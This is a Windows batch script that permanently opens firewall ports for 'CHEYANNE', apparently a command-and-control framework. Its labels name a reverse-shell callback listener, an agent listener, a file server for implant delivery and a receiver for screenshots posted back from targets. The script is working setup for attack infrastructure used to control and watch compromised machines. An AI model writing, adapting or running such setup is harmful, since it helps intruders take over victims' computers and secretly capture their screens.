@echo off
:: CHEYANNE — Permanent Firewall Rules
:: Run as Administrator (right-click > Run as admin)
:: These rules persist across reboots.
:: 22DIV / george wu

echo.
echo   ██████╗██╗  ██╗███████╗██╗   ██╗ █████╗ ███╗   ██╗███╗   ██╗███████╗
echo  ██╔════╝██║  ██║██╔════╝╚██╗ ██╔╝██╔══██╗████╗  ██║████╗  ██║██╔════╝
echo  ██║     ███████║█████╗   ╚████╔╝ ███████║██╔██╗ ██║██╔██╗ ██║█████╗
echo  ██║     ██╔══██║██╔══╝    ╚██╔╝  ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝
echo  ╚██████╗██║  ██║███████╗   ██║   ██║  ██║██║ ╚████║██║ ╚████║███████╗
echo   ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝
echo.
echo  Firewall Setup — All CHEYANNE Ports
echo  ─────────────────────────────────────
echo.

:: Check admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo  [!] NOT RUNNING AS ADMIN. Right-click ^> Run as administrator.
    echo.
    pause
    exit /b 1
)

:: Remove old rules (clean slate)
echo  [*] Clearing old CHEYANNE rules...
netsh advfirewall firewall delete rule name="CHEYANNE-UI" >nul 2>&1
netsh advfirewall firewall delete rule name="CHEYANNE-WATCH" >nul 2>&1
netsh advfirewall firewall delete rule name="CHEYANNE-C2" >nul 2>&1
netsh advfirewall firewall delete rule name="CHEYANNE-AGENT" >nul 2>&1
netsh advfirewall firewall delete rule name="CHEYANNE-SERVE" >nul 2>&1
netsh advfirewall firewall delete rule name="CHEYANNE-RECV" >nul 2>&1

:: Add all rules
echo  [+] Port 4443  — C2 TCP Listener (reverse shell callback)
netsh advfirewall firewall add rule name="CHEYANNE-C2" dir=in action=allow protocol=TCP localport=4443 >nul

echo  [+] Port 8666  — Web Dashboard
netsh advfirewall firewall add rule name="CHEYANNE-UI" dir=in action=allow protocol=TCP localport=8666 >nul

echo  [+] Port 8667  — Agent Listener (binary agent protocol)
netsh advfirewall firewall add rule name="CHEYANNE-AGENT" dir=in action=allow protocol=TCP localport=8667 >nul

echo  [+] Port 8890  — HTTP File Server (deploy/implant delivery)
netsh advfirewall firewall add rule name="CHEYANNE-SERVE" dir=in action=allow protocol=TCP localport=8890 >nul

echo  [+] Port 8891  — Screenshot/Watch Receiver (target POST-back)
netsh advfirewall firewall add rule name="CHEYANNE-RECV" dir=in action=allow protocol=TCP localport=8891 >nul

echo  [+] Port 8892  — Watch Live Viewer (browser auto-refresh)
netsh advfirewall firewall add rule name="CHEYANNE-WATCH" dir=in action=allow protocol=TCP localport=8892 >nul

echo.
echo  ─────────────────────────────────────
echo  [+] ALL PORTS OPEN. Rules are permanent (survive reboot).
echo.
echo  Summary:
echo    4443   C2 listener
echo    8666   Web dashboard        http://LAN_IP:8666
echo    8667   Agent listener
echo    8890   File server           http://LAN_IP:8890
echo    8891   Screenshot receiver
echo    8892   Watch viewer          http://LAN_IP:8892
echo.
echo  The hunt never ends.
echo.
pause
